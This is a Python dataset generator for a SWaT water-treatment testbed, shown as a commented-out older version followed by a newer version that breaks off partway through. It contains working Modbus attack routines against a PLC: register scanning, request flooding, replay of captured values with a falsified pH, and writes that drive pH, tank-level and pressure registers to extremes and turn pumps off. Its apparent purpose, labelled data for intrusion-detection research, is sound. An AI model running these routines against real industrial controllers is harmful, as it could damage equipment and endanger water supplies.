# #!/usr/bin/env python3
# """
# SWAT Automated Dataset Generator - COMPLETE ATTACK SUITE
# =========================================================
# Logs ALL 13 attack types with guaranteed coverage:
# - Temporal attacks (7): pH, tank overflow, chemical, membrane, valve, ramp, stealth
# - Network attacks (3): reconnaissance, DOS, replay
# - Point attacks (3): single register, single coil, multi-point

# Output: Single master CSV with all data (no splitting)
# """

# import sys
# import time
# import random
# import subprocess
# import json
# import platform
# import traceback
# from datetime import datetime
# from pathlib import Path
# from typing import List, Dict, Optional

# sys.path.append(str(Path(__file__).parent))
# from config.swat_config import ATTACK_SCENARIOS, MODBUS_CONFIG

# # Import temporal attack engine
# try:
#     from automated_dataset_generator_v2 import (
#         TemporalAttackEngine, 
#         DirectModbusClient,
#         REG, COIL
#     )
#     HAS_TEMPORAL = True
# except ImportError:
#     HAS_TEMPORAL = False
#     print("Warning: Temporal engine not found, using subprocess attacks")


# # ═══════════════════════════════════════════════════════════════════════════
# # NETWORK ATTACK IMPLEMENTATIONS (in-process)
# # ═══════════════════════════════════════════════════════════════════════════

# class NetworkAttackEngine:
#     """Executes reconnaissance, DOS, and replay attacks."""
    
#     def __init__(self, host: str, port: int, logger_fn):
#         self.host = host
#         self.port = port
#         self.log = logger_fn
#         self.mb = None
    
#     def _connect(self):
#         self.mb = DirectModbusClient(self.host, self.port)
#         return self.mb.connect()
    
#     def _disconnect(self):
#         if self.mb:
#             self.mb.disconnect()
    
#     def reconnaissance(self, duration: int, params: Dict) -> bool:
#         """
#         Network reconnaissance: Scan all registers and coils.
#         Signature: Burst of read requests across address space.
#         """
#         if not self._connect():
#             return False
        
#         self.log(f"  Reconnaissance: Scanning {params.get('end_addr', 100)} addresses")
        
#         try:
#             start_addr = params.get('start_addr', 0)
#             end_addr = params.get('end_addr', 100)
#             scan_rate = params.get('scan_rate', 10)  # addresses/second
            
#             elapsed = 0
#             addr = start_addr
            
#             while elapsed < duration and addr <= end_addr:
#                 # Scan registers
#                 for i in range(scan_rate):
#                     if addr > end_addr:
#                         break
#                     try:
#                         self.mb.read_register(addr)
#                     except:
#                         pass
#                     addr += 1
                
#                 # Scan coils
#                 for i in range(scan_rate // 2):
#                     try:
#                         self.mb.read_coil(random.randint(0, 30))
#                     except:
#                         pass
                
#                 time.sleep(1)
#                 elapsed += 1
            
#             self.log(f"  Reconnaissance complete: scanned {addr - start_addr} addresses")
#             return True
        
#         except Exception as e:
#             self.log(f"Reconnaissance error: {e}", "ERROR")
#             return False
#         finally:
#             self._disconnect()
    
#     def dos_flood(self, duration: int, params: Dict) -> bool:
#         """
#         Denial of Service: Flood PLC with read requests.
#         Signature: Very high request rate (100-1000/second).
#         """
#         if not self._connect():
#             return False
        
#         request_rate = params.get('rate', 500)  # requests/second
#         self.log(f"  DOS Flood: {request_rate} req/s for {duration}s")
        
#         try:
#             start = time.time()
#             request_count = 0
            
#             while time.time() - start < duration:
#                 # Burst of requests
#                 for _ in range(request_rate):
#                     try:
#                         # Random reads
#                         if random.random() > 0.5:
#                             self.mb.read_register(random.randint(0, 50))
#                         else:
#                             self.mb.read_coil(random.randint(0, 24))
#                         request_count += 1
#                     except:
#                         pass  # Don't care about errors in DOS
                
#                 time.sleep(1)
            
#             self.log(f"  DOS complete: sent {request_count:,} requests")
#             return True
        
#         except Exception as e:
#             self.log(f"DOS error: {e}", "ERROR")
#             return False
#         finally:
#             self._disconnect()
    
#     def replay(self, duration: int, params: Dict) -> bool:
#         """
#         Replay attack: Capture normal traffic, replay while attacking.
#         Signature: Sensor values frozen/repeated while attack occurs.
#         """
#         if not self._connect():
#             return False
        
#         capture_duration = params.get('capture_duration', 10)
#         replay_count = params.get('replay_count', 5)
        
#         self.log(f"  Replay: Capture {capture_duration}s, replay {replay_count}× while attacking")
        
#         try:
#             # Phase 1: Capture normal traffic
#             self.log(f"    Capturing normal traffic...")
#             captured_values = []
#             for _ in range(capture_duration):
#                 snapshot = {}
#                 # Capture critical sensors
#                 for reg_addr in [1, 4, 12, 35]:  # LIT_101, pH, DPIT, PIT_501
#                     val = self.mb.read_register(reg_addr)
#                     if val is not None:
#                         snapshot[reg_addr] = val
#                 captured_values.append(snapshot)
#                 time.sleep(1)
            
#             self.log(f"    Captured {len(captured_values)} snapshots")
            
#             # Phase 2: Execute attack while replaying
#             self.log(f"    Executing attack + replay...")
#             attack_duration = duration - capture_duration
            
#             for t in range(attack_duration):
#                 # Write captured (old) values to PLC
#                 replay_snapshot = captured_values[t % len(captured_values)]
#                 for addr, val in replay_snapshot.items():
#                     self.mb.write_register(addr, val)
                
#                 # Also execute a real attack (tank overflow)
#                 if t % 5 == 0:
#                     fake_level = 800 + t * 3  # Level rising
#                     self.mb.write_register(1, min(fake_level, 1000))
                
#                 time.sleep(1)
            
#             self.log(f"  Replay complete")
#             return True
        
#         except Exception as e:
#             self.log(f"Replay error: {e}", "ERROR")
#             return False
#         finally:
#             self._disconnect()


# class PointAttackEngine:
#     """Single-point and multi-point register/coil manipulation."""
    
#     def __init__(self, host: str, port: int, logger_fn):
#         self.host = host
#         self.port = port
#         self.log = logger_fn
#         self.mb = None
    
#     def _connect(self):
#         self.mb = DirectModbusClient(self.host, self.port)
#         return self.mb.connect()
    
#     def _disconnect(self):
#         if self.mb:
#             self.mb.disconnect()
    
#     def single_register(self, duration: int, params: Dict) -> bool:
#         """Write single register to extreme value."""
#         if not self._connect():
#             return False
        
#         target_addr = params.get('target_address', 4)  # Default: pH
#         target_value = params.get('value', 300)  # Extreme low pH
        
#         self.log(f"  Single Register: addr={target_addr}, value={target_value}")
        
#         try:
#             for _ in range(duration):
#                 self.mb.write_register(target_addr, target_value)
#                 time.sleep(1)
#             return True
#         finally:
#             self._disconnect()
    
#     def single_coil(self, duration: int, params: Dict) -> bool:
#         """Toggle single coil (pump/valve)."""
#         if not self._connect():
#             return False
        
#         target_addr = params.get('target_address', 4)  # Default: P_203
#         target_state = params.get('value', False)
        
#         self.log(f"  Single Coil: addr={target_addr}, state={target_state}")
        
#         try:
#             for _ in range(duration):
#                 self.mb.write_coil(target_addr, target_state)
#                 time.sleep(1)
#             return True
#         finally:
#             self._disconnect()
    
#     def multi_point(self, duration: int, params: Dict) -> bool:
#         """Write multiple registers/coils simultaneously."""
#         if not self._connect():
#             return False
        
#         self.log(f"  Multi-Point: Simultaneous writes to 5 targets")
        
#         try:
#             for _ in range(duration):
#                 # Write to multiple critical sensors
#                 self.mb.write_register(1, 950)     # LIT_101 high
#                 self.mb.write_register(4, 450)     # pH low
#                 self.mb.write_register(12, 600)    # DPIT high
#                 self.mb.write_coil(0, False)       # P_101 off
#                 self.mb.write_coil(4, False)       # P_203 off
#                 time.sleep(1)
#             return True
#         finally:
#             self._disconnect()


# # ═══════════════════════════════════════════════════════════════════════════
# # METADATA FILE (cross-process IPC)
# # ═══════════════════════════════════════════════════════════════════════════

# class AttackMetadataFile:
#     def __init__(self, filepath: str = 'attack_metadata.json'):
#         self.filepath = Path(filepath)
#         self.update(0, 'Normal', '')
    
#     def update(self, attack_id: int, attack_name: str, mitre_id: str):
#         data = {
#             'ATTACK_ID': attack_id,
#             'ATTACK_NAME': attack_name,
#             'MITRE_ID': mitre_id,
#             'timestamp': datetime.now().isoformat()
#         }
#         with open(self.filepath, 'r+', encoding='utf-8') as f:
#             f.seek(0)
#             json.dump(data, f)
#             f.truncate()     # remove old content
#             f.flush()

#             import os
#             os.fsync(f.fileno())
    
#     def read(self) -> Dict:
#         try:
#             if self.filepath.exists():
#                 with open(self.filepath, 'r', encoding='utf-8') as f:
#                     return json.load(f)
#         except:
#             pass
#         return {'ATTACK_ID': 0, 'ATTACK_NAME': 'Normal', 'MITRE_ID': ''}


# # ═══════════════════════════════════════════════════════════════════════════
# # MAIN GENERATOR WITH ALL 13 ATTACKS
# # ═══════════════════════════════════════════════════════════════════════════

# class ComprehensiveDatasetGenerator:
#     """
#     Generates dataset with ALL 13 attack types guaranteed.
#     Single CSV output (no splitting).
#     """
    
#     def __init__(self,
#                  plc_host: str,
#                  output_dir: str = 'complete_dataset',
#                  total_duration_min: int = 120,
#                  attack_duration_min: int = 60,
#                  plc_port: int = 1502):
        
#         self.plc_host = plc_host
#         self.plc_port = plc_port
#         self.output_dir = Path(output_dir)
#         self.output_dir.mkdir(exist_ok=True)
        
#         self.total_duration = total_duration_min * 60
#         self.attack_duration = attack_duration_min * 60
        
#         self.master_csv = self.output_dir / 'master_dataset.csv'
#         self.timeline_log = self.output_dir / 'attack_timeline.log'
#         self.execution_log = self.output_dir / 'execution_details.log'
#         self.metadata_file = self.output_dir / 'attack_metadata.json'
        
#         self.metadata = AttackMetadataFile(str(self.metadata_file))
#         self.logger_proc = None
#         self.attack_timeline = []
#         self.start_time = None
#         self.is_windows = platform.system() == 'Windows'
        
#         # ALL 13 ATTACK TYPES
#         self.all_attacks = [
#             # Temporal (7)
#             'ph_manipulation',
#             'tank_overflow',
#             'chemical_depletion',
#             'membrane_damage',
#             'valve_manipulation',
#             'slow_ramp',
#             'multi_stealth',
#             # Network (3)
#             'reconnaissance',
#             'dos_flood',
#             'replay',
#             # Point (3)
#             'single_register',
#             'single_coil',
#             'multi_point',
#         ]
        
#         # Attack metadata (IDs, names, MITRE)
#         self.attack_meta = {
#             'ph_manipulation':    {'id': 11, 'name': 'pH Manipulation Attack',     'mitre': 'T0836'},
#             'tank_overflow':      {'id':  8, 'name': 'Tank Overflow Attack',       'mitre': 'T0836'},
#             'chemical_depletion': {'id':  9, 'name': 'Chemical Depletion Attack',  'mitre': 'T0836'},
#             'membrane_damage':    {'id': 10, 'name': 'Membrane Damage Attack',     'mitre': 'T0836'},
#             'valve_manipulation': {'id': 16, 'name': 'Valve Manipulation Attack',  'mitre': 'T0836'},
#             'slow_ramp':          {'id': 12, 'name': 'Slow Ramp Attack',           'mitre': 'T0836'},
#             'multi_stealth':      {'id': 17, 'name': 'Multi-Variable Stealth',     'mitre': 'T0856'},
#             'reconnaissance':     {'id': 13, 'name': 'Reconnaissance Scan',        'mitre': 'T0840'},
#             'dos_flood':          {'id': 14, 'name': 'Denial of Service',          'mitre': 'T0814'},
#             'replay':             {'id': 15, 'name': 'Replay Attack',              'mitre': 'T0839'},
#             'single_register':    {'id': 18, 'name': 'Single Register Attack',     'mitre': 'T0836'},
#             'single_coil':        {'id': 19, 'name': 'Single Coil Attack',         'mitre': 'T0836'},
#             'multi_point':        {'id': 20, 'name': 'Multi-Point Attack',         'mitre': 'T0836'},
#         }
    
#     def log(self, msg: str, level: str = 'INFO'):
#         line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] [{level}] {msg}"
#         print(line)
#         with open(self.execution_log, 'a', encoding='utf-8') as f:
#             f.write(line + '\n')
    
#     def generate_guaranteed_schedule(self) -> List[Dict]:
#         """
#         Generate schedule ensuring ALL 13 attack types happen at least once.
#         Remaining time filled with random attacks.
#         """
#         self.log("Generating attack schedule with guaranteed coverage...")
        
#         schedule = []
#         current_time = 60  # Start after 1min of normal data
#         total_used = 0
        
#         # Phase 1: GUARANTEE each attack type happens once
#         random.shuffle(self.all_attacks)  # Random order
        
#         for attack_type in self.all_attacks:
#             if current_time >= self.total_duration:
#                 break
            
#             # Duration based on attack type
#             if attack_type in ['reconnaissance', 'dos_flood']:
#                 duration = random.randint(30, 60)   # Network attacks shorter
#             elif attack_type in ['single_register', 'single_coil']:
#                 duration = random.randint(20, 45)   # Point attacks shorter
#             elif attack_type == 'slow_ramp':
#                 duration = random.randint(300, 600) # Ramp longer
#             else:
#                 duration = random.randint(300,600)  # Normal temporal attacks
            
#             # Ensure doesn't exceed attack budget
#             if total_used + duration > self.attack_duration:
#                 duration = self.attack_duration - total_used
            
#             meta = self.attack_meta[attack_type]
#             params = self._random_params(attack_type)
            
#             event = {
#                 'start_time': current_time,
#                 'duration': duration,
#                 'type': attack_type,
#                 'name': meta['name'],
#                 'mitre_id': meta['mitre'],
#                 'id': meta['id'],
#                 'params': params,
#             }
            
#             schedule.append(event)
#             total_used += duration
#             current_time += duration + random.randint(30, 120)  # Gap between attacks
        
#         # Phase 2: Fill remaining attack time with random attacks
#         while total_used < self.attack_duration and current_time < self.total_duration:
#             attack_type = random.choice(self.all_attacks)
#             duration = random.randint(30, 120)
            
#             if total_used + duration > self.attack_duration:
#                 duration = self.attack_duration - total_used
            
#             meta = self.attack_meta[attack_type]
#             params = self._random_params(attack_type)
            
#             event = {
#                 'start_time': current_time,
#                 'duration': duration,
#                 'type': attack_type,
#                 'name': meta['name'],
#                 'mitre_id': meta['mitre'],
#                 'id': meta['id'],
#                 'params': params,
#             }
            
#             schedule.append(event)
#             total_used += duration
#             current_time += duration + random.randint(30, 90)
        
#         self.log(f"  Generated {len(schedule)} attacks")
#         self.log(f"  Total attack time: {total_used}s ({total_used/60:.1f}min)")
#         self.log(f"  Coverage: {len(set(e['type'] for e in schedule))}/13 attack types")
        
#         for i, e in enumerate(schedule, 1):
#             self.log(f"  [{i:2d}] {e['name']:35s} @{e['start_time']/60:5.1f}min  "
#                     f"dur={e['duration']:3d}s", 'SCHEDULE')
        
#         return schedule
    
#     def _random_params(self, attack_type: str) -> Dict:
#         """Generate random parameters for each attack type."""
#         if attack_type == 'ph_manipulation':
#             return {'target_ph': random.choice([
#                 round(random.uniform(3.5, 5.5), 1),
#                 round(random.uniform(8.5, 10.5), 1)
#             ])}
        
#         elif attack_type == 'tank_overflow':
#             return {'overflow_value': random.randint(900, 1000)}
        
#         elif attack_type == 'chemical_depletion':
#             return {}
        
#         elif attack_type == 'membrane_damage':
#             return {'target_pressure': random.randint(160, 210)}
        
#         elif attack_type == 'valve_manipulation':
#             return {'valve_position': random.choice([0, 0, 0, 2])}
        
#         elif attack_type == 'slow_ramp':
#             start = random.randint(400, 650)
#             end = random.randint(750, 950)
#             return {'start_value': start, 'end_value': end, 
#                    'target_register': random.choice([1, 12, 14, 26])}
        
#         elif attack_type == 'multi_stealth':
#             return {}
        
#         elif attack_type == 'reconnaissance':
#             return {'start_addr': 0, 'end_addr': random.randint(50, 150),
#                    'scan_rate': random.randint(5, 20)}
        
#         elif attack_type == 'dos_flood':
#             return {'rate': random.randint(200, 1000)}
        
#         elif attack_type == 'replay':
#             return {'capture_duration': random.randint(10, 30),
#                    'replay_count': random.randint(3, 10)}
        
#         elif attack_type == 'single_register':
#             return {'target_address': random.choice([1, 4, 12, 35]),
#                    'value': random.randint(100, 1000)}
        
#         elif attack_type == 'single_coil':
#             return {'target_address': random.choice([0, 4, 8, 15]),
#                    'value': random.choice([True, False])}
        
#         elif attack_type == 'multi_point':
#             return {}
        
#         return {}
    
#     def start_background_logging(self):
#         """Start continuous logger (single CSV output)."""
#         self.log("Starting background logger...")
        
#         cmd = [
#             sys.executable,
#             str(Path('logging') / 'data_logger.py'),
#             '--host', self.plc_host,
#             '--port', str(self.plc_port),
#             '--interval', '1.0',
#             '--output', str(self.master_csv),
#             '--metadata-file', str(self.metadata_file),
#         ]
        
#         self.log(f"  cmd: {' '.join(cmd)}")
        
#         self.logger_proc = subprocess.Popen(
#             cmd,
#             stdout=subprocess.DEVNULL,
#             stderr=subprocess.DEVNULL
#         )
#         time.sleep(5)
        
#         if self.logger_proc.poll() is None:
#             self.log(f"  Logger started (PID {self.logger_proc.pid})")
#         else:
#             out, err = self.logger_proc.communicate()
#             self.log(f"Logger STDOUT: {out.decode()}", 'ERROR')
#             self.log(f"Logger STDERR: {err.decode()}", 'ERROR')
#             raise RuntimeError("Logger failed")
    
#     def execute_attack(self, event: Dict):
#         """Execute one attack using appropriate engine with timeout protection."""
#         attack_type = event['type']
#         meta = self.attack_meta[attack_type]
        
#         self.log(f"► {meta['name']}  dur={event['duration']}s  "
#                 f"params={event['params']}", 'ATTACK')
        
#         # Update metadata for CSV labeling
#         self.metadata.update(meta['id'], meta['name'], meta['mitre'])
        
#         success = False
#         start_time = time.time()
        
#         try:
#             # Route to appropriate engine
#             if attack_type in ['ph_manipulation', 'tank_overflow', 'chemical_depletion',
#                               'membrane_damage', 'valve_manipulation', 'slow_ramp',
#                               'multi_stealth']:
#                 # Temporal attacks
#                 if HAS_TEMPORAL:
#                     engine = TemporalAttackEngine(
#                         host=self.plc_host,
#                         port=self.plc_port,
#                         logger_fn=self.log,
#                         unit_id=MODBUS_CONFIG.get('unit_id', 1)
#                     )
#                     success = engine.run(attack_type, event['duration'], event['params'])
#                 else:
#                     # Fallback to subprocess
#                     success = self._execute_subprocess_attack(attack_type, event)
            
#             elif attack_type in ['reconnaissance', 'dos_flood', 'replay']:
#                 # Network attacks
#                 engine = NetworkAttackEngine(self.plc_host, self.plc_port, self.log)
#                 method = getattr(engine, attack_type)
#                 success = method(event['duration'], event['params'])
            
#             elif attack_type in ['single_register', 'single_coil', 'multi_point']:
#                 # Point attacks
#                 engine = PointAttackEngine(self.plc_host, self.plc_port, self.log)
#                 method = getattr(engine, attack_type)
#                 success = method(event['duration'], event['params'])
            
#             elapsed = time.time() - start_time
#             self.log(f"  ✓ {attack_type} complete (success={success}, took {elapsed:.1f}s)")
        
#         except Exception as e:
#             elapsed = time.time() - start_time
#             self.log(f"  ✗ {attack_type} FAILED after {elapsed:.1f}s: {e}", 'ERROR')
#             self.log(traceback.format_exc(), 'ERROR')
#             success = False
        
#         finally:
#             # ALWAYS reset metadata to Normal, even on failure
#             self.metadata.update(0, 'Normal', '')
            
#             self.attack_timeline.append({
#                 **event,
#                 'actual_start': datetime.now().isoformat(),
#                 'success': success,
#             })
    
#     def _execute_subprocess_attack(self, attack_type: str, event: Dict) -> bool:
#         """Fallback: Use command_injection.py subprocess."""
#         cmd = [
#             sys.executable,
#             str(Path('attacks') / 'command_injection.py'),
#             '--host', self.plc_host,
#             '--attack', attack_type,
#             '--duration', str(event['duration'])
#         ]
        
#         # Add attack-specific params
#         params = event['params']
#         if attack_type == 'ph_manipulation' and 'target_ph' in params:
#             cmd.extend(['--target-ph', str(params['target_ph'])])
#         elif attack_type == 'tank_overflow' and 'overflow_value' in params:
#             cmd.extend(['--overflow-value', str(params['overflow_value'])])
        
#         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#         proc.wait()
#         return proc.returncode == 0
    
#     def run(self):
#         """Main execution loop."""
#         self.start_time = datetime.now()
        
#         self.log("═" * 70)
#         self.log("COMPREHENSIVE SWAT DATASET GENERATOR")
#         self.log("═" * 70)
#         self.log(f"OS:      {platform.system()}")
#         self.log(f"Total:   {self.total_duration/60:.0f} min")
#         self.log(f"Attacks: {self.attack_duration/60:.0f} min")
#         self.log(f"Normal:  {(self.total_duration-self.attack_duration)/60:.0f} min")
#         self.log(f"Output:  {self.master_csv}")
        
#         try:
#             schedule = self.generate_guaranteed_schedule()
#             self.start_background_logging()
            
#             elapsed = 0
#             attack_index = 0
            
#             self.log("Entering main loop...")
            
#             while elapsed < self.total_duration:
#                 # Check for pending attacks
#                 if attack_index < len(schedule):
#                     nxt = schedule[attack_index]
                    
#                     # Debug: Log when approaching attack time
#                     time_until_attack = nxt['start_time'] - elapsed
#                     if 0 < time_until_attack <= 5:
#                         self.log(f"Next attack in {time_until_attack}s: {nxt['name']}", 'DEBUG')
                    
#                     if elapsed >= nxt['start_time']:
#                         self.log(f"Triggering attack #{attack_index+1}/{len(schedule)}", 'DEBUG')
#                         self.execute_attack(nxt)
#                         attack_index += 1
#                         self.log(f"Attack complete, moving to next (index now {attack_index})", 'DEBUG')
                
#                 time.sleep(1)
#                 elapsed += 1
                
#                 if elapsed % 60 == 0:  # Every minute
#                     progress = (elapsed / self.total_duration) * 100
#                     attacks_done = attack_index
#                     attacks_total = len(schedule)
#                     self.log(f"Progress: {elapsed/60:.1f}/{self.total_duration/60:.0f}min "
#                             f"({progress:.1f}%) | Attacks: {attacks_done}/{attacks_total}")
            
#             self.log("Main loop complete")
        
#         except KeyboardInterrupt:
#             self.log("Interrupted by user", 'WARNING')
#         except Exception as e:
#             self.log(f"Fatal error: {e}", 'ERROR')
#             self.log(traceback.format_exc(), 'ERROR')
#         finally:
#             self.cleanup()
    
#     def cleanup(self):
#         """Stop logger and generate report."""
#         self.log("Cleanup starting...")
        
#         if self.logger_proc and self.logger_proc.poll() is None:
#             self.logger_proc.terminate()
#             try:
#                 self.logger_proc.wait(timeout=10)
#                 self.log("Logger stopped")
#             except subprocess.TimeoutExpired:
#                 self.logger_proc.kill()
        
#         self.metadata.update(0, 'Normal', '')
#         self.generate_report()
#         self.log("Cleanup complete")
    
#     def generate_report(self):
#         """Generate comprehensive analysis report."""
#         self.log("Generating report...")
        
#         if not self.master_csv.exists():
#             self.log("CSV not found", 'ERROR')
#             return
        
#         try:
#             import pandas as pd
#             df = pd.read_csv(self.master_csv)
            
#             lines = [
#                 "═" * 70,
#                 "COMPREHENSIVE SWAT DATASET - ANALYSIS REPORT",
#                 "═" * 70,
#                 f"Generated:  {datetime.now():%Y-%m-%d %H:%M:%S}",
#                 f"Start Time: {self.start_time:%Y-%m-%d %H:%M:%S}",
#                 f"Duration:   {self.total_duration/60:.1f} min",
#                 "",
#                 "DATASET STATISTICS:",
#                 f"  Total rows:  {len(df):,}",
#                 f"  Normal:      {(df.ATTACK_ID==0).sum():,} ({(df.ATTACK_ID==0).sum()/len(df)*100:.1f}%)",
#                 f"  Attack:      {(df.ATTACK_ID>0).sum():,} ({(df.ATTACK_ID>0).sum()/len(df)*100:.1f}%)",
#                 "",
#             ]
            
#             if (df.ATTACK_ID > 0).sum() > 0:
#                 lines.append("ATTACK BREAKDOWN (All 13 Types):")
#                 for (aid, name), cnt in df[df.ATTACK_ID>0].groupby(['ATTACK_ID','ATTACK_NAME']).size().items():
#                     lines.append(f"  [{aid:2d}] {name:35s} {cnt:5,} rows ({cnt/len(df)*100:.2f}%)")
#                 lines.append("")
            
#             lines.append("ATTACK TIMELINE:")
#             for i, ev in enumerate(self.attack_timeline, 1):
#                 lines.append(f"  {i:2d}. {ev['name']:35s} @{ev['start_time']/60:.1f}min  "
#                            f"dur={ev['duration']:3d}s")
#             lines.append("")
            
#             lines += [
#                 "OUTPUT FILE:",
#                 f"  {self.master_csv}",
#                 "  (Single CSV with all data - no splitting)",
#                 "═" * 70,
#             ]
            
#             report_text = '\n'.join(lines)
#             with open(self.timeline_log, 'w', encoding='utf-8') as f:
#                 f.write(report_text)
#             print(report_text)
        
#         except Exception as e:
#             self.log(f"Report error: {e}", 'ERROR')


# def main():
#     import argparse
    
#     parser = argparse.ArgumentParser(
#         description='Comprehensive SWAT Dataset Generator (All 13 Attacks)',
#         formatter_class=argparse.RawDescriptionHelpFormatter,
#         epilog="""
# Examples:
#   # Standard 2 hours (40 min attacks):
#   python comprehensive_generator.py --host 192.168.1.100
  
#   # 3 hours with 60 min attacks:
#   python comprehensive_generator.py --host 192.168.1.100 --total 180 --attack 60
  
#   # Quick 10-minute test:
#   python comprehensive_generator.py --host 192.168.1.100 --total 10 --attack 5
#         """
#     )
#     parser.add_argument('--host', required=True, help='PLC IP address')
#     parser.add_argument('--port', type=int, default=1502, help='Modbus port')
#     parser.add_argument('--total', type=int, default=120, help='Total duration (min)')
#     parser.add_argument('--attack', type=int, default=40, help='Attack duration (min, 40-60 recommended)')
#     parser.add_argument('--output', default='complete_dataset', help='Output directory')
    
#     args = parser.parse_args()
    
#     if args.attack > args.total * 0.7:
#         print(f"Warning: Attack duration ({args.attack}min) > 70% of total ({args.total}min)")
#         print("Recommended: attack duration = 30-50% of total for realistic dataset")
    
#     gen = ComprehensiveDatasetGenerator(
#         plc_host=args.host,
#         plc_port=args.port,
#         output_dir=args.output,
#         total_duration_min=args.total,
#         attack_duration_min=args.attack,
#     )
#     gen.run()
    
#     print("\n✅ Dataset generation complete!")
#     print(f"📁 Results in '{args.output}/'")
#     print(f"📄 Single CSV: {args.output}/master_dataset.csv")


# if __name__ == '__main__':
#     main()

#!/usr/bin/env python3
"""
SWAT Automated Dataset Generator - FIXED VERSION
=================================================
- 60 min normal + 60 min attack = 120 min total
- Each attack: 5-10 minutes (300-600 seconds)
- Network attacks (DOS, Replay, Recon): 3 instances each
- Temporal/Command attacks: Random selection
- Fixes 0s duration bug
"""

import sys
import time
import random
import subprocess
import json
import platform
import traceback
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Optional

sys.path.append(str(Path(__file__).parent))
from config.swat_config import ATTACK_SCENARIOS, MODBUS_CONFIG


def clamp(value: float, low: float, high: float) -> float:
    return max(low, min(high, value))

# # Import temporal attack engine
# try:
#     from automated_dataset_generator_v2 import (
#         TemporalAttackEngine, 
#         DirectModbusClient,
#         REG, COIL
#     )
#     HAS_TEMPORAL = True
# except ImportError:
#     HAS_TEMPORAL = False
#     print("Warning: Temporal engine not found, using subprocess attacks")


# ─────────────────────────────────────────────────────────────────────────────
# DIRECT MODBUS CLIENT
# ─────────────────────────────────────────────────────────────────────────────

class DirectModbusClient:
    """Thin wrapper around pymodbus for direct in-process writes."""

    def __init__(self, host: str, port: int = 1502, unit_id: int = 1):
        from pymodbus.client import ModbusTcpClient
        self.client = ModbusTcpClient(host=host, port=port, timeout=3)
        self.unit_id = unit_id
        self.connected = False

    def connect(self) -> bool:
        self.connected = self.client.connect()
        return self.connected

    def disconnect(self):
        if self.client:
            self.client.close()
        self.connected = False

    def read_register(self, address: int) -> Optional[int]:
        try:
            r = self.client.read_holding_registers(address, count=1, slave=self.unit_id)
            if not r.isError():
                return r.registers[0]
        except Exception:
            pass
        return None

    def write_register(self, address: int, value: int) -> bool:
        try:
            value = int(clamp(value, 0, 65535))
            r = self.client.write_register(address, value, slave=self.unit_id)
            return not r.isError()
        except Exception:
            return False

    def write_coil(self, address: int, value: bool) -> bool:
        try:
            r = self.client.write_coil(address, value, slave=self.unit_id)
            return not r.isError()
        except Exception:
            return False

    def read_coil(self, address: int) -> Optional[bool]:
        try:
            r = self.client.read_coils(address, count=1, slave=self.unit_id)
            if not r.isError():
                return bool(r.bits[0])
        except Exception:
            pass
        return None


# ═══════════════════════════════════════════════════════════════════════════
# NETWORK ATTACK IMPLEMENTATIONS (copied from original)
# ═══════════════════════════════════════════════════════════════════════════

class NetworkAttackEngine:
    """Executes reconnaissance, DOS, and replay attacks."""
    
    def __init__(self, host: str, port: int, logger_fn):
        self.host = host
        self.port = port
        self.log = logger_fn
        self.mb = None
    
    def _connect(self):
        self.mb = DirectModbusClient(self.host, self.port)
        return self.mb.connect()
    
    def _disconnect(self):
        if self.mb:
            self.mb.disconnect()
    
    def reconnaissance(self, duration: int, params: Dict) -> bool:
        """Network reconnaissance: Scan all registers and coils."""
        if not self._connect():
            return False
        
        self.log(f"  Reconnaissance: Scanning {params.get('end_addr', 100)} addresses")
        
        try:
            start_addr = params.get('start_addr', 0)
            end_addr = params.get('end_addr', 100)
            scan_rate = params.get('scan_rate', 10)
            
            elapsed = 0
            addr = start_addr
            total_scanned = 0
            
            # Run for the full duration, wrapping around the address space
            # so the scan window matches the scheduled attack duration instead
            # of exiting after one pass (~14 s for 100 addresses at rate 10).
            while elapsed < duration:
                for i in range(scan_rate):
                    try:
                        self.mb.read_register(addr)
                    except:
                        pass
                    addr += 1
                    total_scanned += 1
                    if addr > end_addr:
                        addr = start_addr  # wrap-around: keeps scanning until time is up
                
                for i in range(scan_rate // 2):
                    try:
                        self.mb.read_coil(random.randint(0, 27))
                    except:
                        pass
                
                time.sleep(1)
                elapsed += 1
            
            self.log(f"  Reconnaissance complete: {total_scanned} register reads over {elapsed}s")
            return True
        except Exception as e:
            self.log(f"  Reconnaissance failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def dos_flood(self, duration: int, params: Dict) -> bool:
        """DOS attack: Flood PLC with requests."""
        if not self._connect():
            return False
        
        request_rate = params.get('request_rate', 500)
        self.log(f"  DOS: Flooding at {request_rate} req/s")
        
        try:
            elapsed = 0
            total_requests = 0
            
            while elapsed < duration:
                start = time.time()
                
                for _ in range(request_rate):
                    try:
                        addr = random.randint(0, 50)
                        self.mb.read_register(addr)
                        total_requests += 1
                    except:
                        pass
                
                time.sleep(max(0, 1 - (time.time() - start)))
                elapsed += 1
            
            self.log(f"  DOS complete: {total_requests} requests sent")
            return True
        except Exception as e:
            self.log(f"  DOS failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def replay(self, duration: int, params: Dict) -> bool:
        """Replay attack: Capture and replay legitimate traffic."""
        if not self._connect():
            return False
        
        capture_time = params.get('capture_time', 10)
        self.log(f"  Replay: Capturing {capture_time}s of normal traffic")
        
        try:
            # Phase 1: Capture
            captured = []
            for _ in range(capture_time):
                snapshot = {}
                for addr in range(0, 30):
                    try:
                        val = self.mb.read_register(addr)
                        if val is not None:
                            snapshot[addr] = val
                    except:
                        pass
                captured.append(snapshot)
                time.sleep(1)
            
            self.log(f"  Captured {len(captured)} snapshots, starting replay...")
            
            # Phase 2: Modify one value and replay
            if captured:
                for snapshot in captured:
                    if 4 in snapshot:  # pH sensor
                        snapshot[4] = 500  # Fake pH
                
                # Replay loop
                replay_time = duration - capture_time
                for _ in range(replay_time):
                    snap = random.choice(captured)
                    for addr, val in snap.items():
                        try:
                            self.mb.write_register(addr, val)
                        except:
                            pass
                    time.sleep(1)
            
            self.log(f"  Replay complete")
            return True
        except Exception as e:
            self.log(f"  Replay failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()


class PointAttackEngine:
    """Executes single/multi point write attacks."""
    
    def __init__(self, host: str, port: int, logger_fn):
        self.host = host
        self.port = port
        self.log = logger_fn
        self.mb = None
    
    def _connect(self):
        self.mb = DirectModbusClient(self.host, self.port)
        return self.mb.connect()
    
    def _disconnect(self):
        if self.mb:
            self.mb.disconnect()
    
    def single_register(self, duration: int, params: Dict) -> bool:
        """Write single register with extreme value."""
        if not self._connect():
            return False
        
